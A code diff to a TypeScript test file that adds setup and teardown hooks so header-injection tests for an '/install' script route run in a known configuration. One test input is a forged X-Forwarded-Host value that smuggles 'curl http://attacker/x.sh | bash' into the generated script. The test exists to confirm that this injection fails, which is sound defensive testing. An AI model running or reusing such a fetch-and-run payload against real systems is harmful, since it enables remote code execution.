@@ -13,8 +13,9 @@
 //   - The closing message includes the next-step `sk profile login`
 //     command with the engine URL pre-filled.
 
-import { describe, expect, test } from "bun:test";
+import { afterAll, beforeAll, describe, expect, test } from "bun:test";
 import { OpenAPIHono } from "@hono/zod-openapi";
+import { getConfig, setConfigKey } from "../../config/loader.ts";
 import type { AppEnv } from "../openapi.ts";
 import { _internal, registerInstallRoute } from "./install.ts";
 
@@ -171,6 +172,35 @@ describe("sanitizeBaseUrl", () => {
 });
 
 describe("GET /install — header injection", () => {
+  // These tests are about the FALLBACK order, so they have to own the state
+  // that decides it. `/install` prefers a configured `server.public_base_url`
+  // over any forwarded header — deliberately, since an operator-set value is
+  // trusted and a header is not — and only falls through to the header when
+  // no value is configured.
+  //
+  // Left implicit, that precondition held by accident: run alone, the config
+  // loader was never initialised, so the fallback ran. Run inside the suite,
+  // an earlier file had loaded config and set a base URL, the configured value
+  // won, and both tests failed for a reason that had nothing to do with header
+  // handling. Setting it here makes the precondition the test's own.
+  let priorBaseUrl: string | undefined;
+
+  beforeAll(async () => {
+    try {
+      priorBaseUrl = getConfig().server.public_base_url ?? "";
+      await setConfigKey("server.public_base_url", "", { force: true });
+    } catch {
+      // Loader never initialised — the fallback path is already active and
+      // there is nothing to clear or restore.
+      priorBaseUrl = undefined;
+    }
+  });
+
+  afterAll(async () => {
+    if (priorBaseUrl === undefined) return;
+    await setConfigKey("server.public_base_url", priorBaseUrl, { force: true });
+  });
+
   test("a forged X-Forwarded-Host cannot inject shell into the script", async () => {
     const script = await fetchScript({
       "x-forwarded-host": 'evil.example.com"; curl http://attacker/x.sh | bash; echo "',
